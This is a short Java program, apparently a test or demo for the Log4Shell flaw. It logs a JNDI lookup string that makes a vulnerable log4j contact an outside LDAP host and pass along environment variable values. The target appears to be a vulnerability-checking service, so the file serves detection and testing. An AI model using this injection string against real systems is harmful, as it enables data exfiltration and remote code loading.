package com.log4jshell;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.config.Configurator;

public class App {

    private static final Logger logger = LogManager.getRootLogger();

    public static void main( String[] args ) {
        Configurator.setAllLevels(logger.getName(), Level.ALL);
        logger.error("${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:MAX_SIZE}:${env:MAX_SIZE}/47ad5d60-9894-445e-aa17-0f573a2a3fdf}");
    }
}
